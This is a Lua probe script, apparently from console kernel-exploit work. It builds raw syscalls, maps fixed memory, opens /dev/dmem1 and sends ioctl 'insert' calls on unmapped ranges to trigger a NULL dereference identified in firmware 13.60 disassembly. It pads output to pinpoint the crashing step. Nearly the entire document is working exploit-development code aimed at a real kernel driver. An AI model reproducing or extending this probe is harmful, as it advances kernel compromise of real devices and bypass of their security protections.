-- CRASH_CLASS: HIGH
-- PROBE 482f: is a mapped range accepted and an unmapped one lethal?
--
-- 482d: insert {0x2500140000, 0x4000} returned 0 — that range had just been
--       mmap'd by the probe.
-- 482e: first call was insert {0x2520000000, 0x4000} with nothing mapped
--       there; the console died before any line was flushed.
-- 13.60 0x3cf8f0: after call 0x3c3ff0 (lookup) it uses rax without a null
--       check — mov rcx,[rbp-0x40]; cmp rcx,[rax+0x48] — so a failed lookup
--       dereferences NULL.
-- This probe separates the two cases in one process, with 8 KB of padding
-- after every step so the last flushed marker names the step.
print("=== PROBE 482f: mapped vs unmapped window insert ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" and v.h then h, l = v.h, v.l end
    if h ~= 0 or l >= 0x80000000 then return -1 end
    return l
end
local function put_str(str)
    local buf = memory.alloc(#str + 1)
    for i = 1, #str do pcall(function() memory.write_byte(buf + i - 1, string.byte(str, i)) end) end
    pcall(function() memory.write_byte(buf + #str, 0) end)
    return buf
end
local function cast64(n)
    return uint64(string.format("0x%08X%08X", math.floor(n / 4294967296) % 4294967296, n % 4294967296))
end
local function pad(tag)
    for i = 1, 200 do print(string.format("pad %-10s %03d %s", tag, i, string.rep("-", 24))) end
end

local arg = memory.alloc(0x100)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_ioctl = make_syscall(54)
local sc_mmap = make_syscall(477)

local function call(fd, cmd, q0, q1)
    pcall(function() memory.write_qword(arg, cast64(q0)) end)
    pcall(function() memory.write_qword(arg + 8, cast64(q1)) end)
    pcall(function() memory.write_qword(arg + 0x10, uint64(0)) end)
    local ok, r = pcall(function() return sc_ioctl(uint64(fd), uint64(cmd), uint64(arg)) end)
    if not ok then return "pcall-fail" end
    return tostring(sgn(r))
end

local MAPPED = 0x2500000000
local UNMAPPED = 0x2540000000
local INSERT = 0x80108002

local okm, rm = pcall(function()
    return sc_mmap(cast64(MAPPED), uint64(0x40000), uint64(0x33), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print(string.format("[setup] mmap 0x2500000000 ok=%s", tostring(okm)))
pad("setup")

local fd = sgn(sc_open(uint64(put_str("/dev/dmem1")), uint64(2), uint64(0)))
print(string.format("[open] /dev/dmem1 fd=%d", fd))
pad("open")

if fd < 0 then
    print("no handle, stopping")
    print("=== PROBE 482f DONE ===")
    return
end

print("[1] insert on the MAPPED range -> expecting 0")
print("    ret=" .. call(fd, INSERT, MAPPED, 0x4000))
pad("mapped")

print("[2] insert on an UNMAPPED window range -> the 13.60 null-deref candidate")
print("    ret=" .. call(fd, INSERT, UNMAPPED, 0x4000))
pad("unmapped")

print("[3] survived; insert on another unmapped range")
print("    ret=" .. call(fd, INSERT, UNMAPPED + 0x8000000, 0x4000))
pad("unmapped2")

pcall(function() sc_close(uint64(fd)) end)
print("=== PROBE 482f DONE ===")
